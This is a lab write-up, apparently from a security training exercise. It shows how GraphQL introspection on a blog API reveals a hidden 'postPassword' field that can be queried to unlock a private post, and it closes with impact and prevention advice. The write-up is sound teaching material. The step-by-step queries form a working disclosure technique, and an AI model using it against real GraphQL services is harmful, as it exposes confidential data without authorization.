# GraphQL API Vulnerabilities - Accessing Private GraphQL Posts

## Description

This lab contains a GraphQL endpoint that exposes a blog API. The schema allows clients to request fields that were intended to remain private. By performing GraphQL introspection, it is possible to discover hidden fields and retrieve sensitive information such as unpublished blog passwords.

---

## Steps

### 1. Capture the GraphQL Request

Browse any blog post and intercept the GraphQL request.

**Request**

```http
POST /graphql/v1 HTTP/2
```

The request contains a query similar to:

```graphql
query getBlogPost($id: Int!) {
    getBlogPost(id: $id) {
        image
        title
        author
        date
        paragraphs
    }
}
```

---

### 2. Run an Introspection Query

Since introspection is enabled, send the standard GraphQL introspection query.

This reveals:

- Available queries
- Types
- Fields
- Hidden fields
- Input objects

The schema shows that `getBlogPost` contains an additional field:

```graphql
postPassword
```

which is not requested by the frontend.

---

### 3. Modify the Query

Add the hidden field discovered during introspection.

```graphql
query getBlogPost($id: Int!) {
    getBlogPost(id: $id) {
        image
        title
        author
        date
        postPassword
        paragraphs
    }
}
```

---

### 4. Retrieve the Password

Send the modified request.

The response now contains:

```json
{
  "data": {
    "getBlogPost": {
      "title": "...",
      "author": "...",
      "postPassword": "103ztdfaI7wLcaboPbp8i3S4zcfrfq14"
    }
  }
}
```

The hidden password is successfully disclosed.

---

### 5. Use the Password

Navigate to the protected/private blog post and submit the retrieved password.

The protected content becomes accessible and the lab is solved.

---

## Why This Works

The GraphQL server exposed introspection in production.

Although the frontend never requested the `postPassword` field, it still existed in the schema and was accessible to any client that knew its name.

Because GraphQL allows clients to choose which fields to retrieve, attackers can request sensitive fields directly once discovered.

---

## Impact

- Disclosure of confidential information
- Access to protected resources
- Exposure of internal schema
- Easier enumeration of hidden functionality
- Increased attack surface

---

## Prevention

- Disable GraphQL introspection in production.
- Never expose sensitive fields in the schema.
- Implement field-level authorization.
- Use allowlisted (persisted) queries.
- Perform authorization checks for every requested field.
- Limit unnecessary schema exposure.
